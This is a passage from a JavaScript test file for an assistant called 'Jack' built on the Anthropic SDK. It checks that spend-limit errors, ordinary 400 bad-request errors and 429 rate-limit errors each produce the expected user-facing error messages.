    const result = await run()
    expect(result).toMatchObject({ status: "error", outcome: "api_error" })
    expect(result.text).toMatch(/spend limit/)
  })

  it("still calls an ordinary 400 a bug, and an ordinary 429 a busy minute", () => {
    expect(apiErrorMessage(badRequest("messages: text content blocks must be non-empty"), "Jack")).toMatch(/bug in Jack/)
    expect(apiErrorMessage(new Anthropic.RateLimitError(429, { type: "error" }, "rate limited", new Headers()), "Jack")).toMatch(/too many requests/)
  })
})
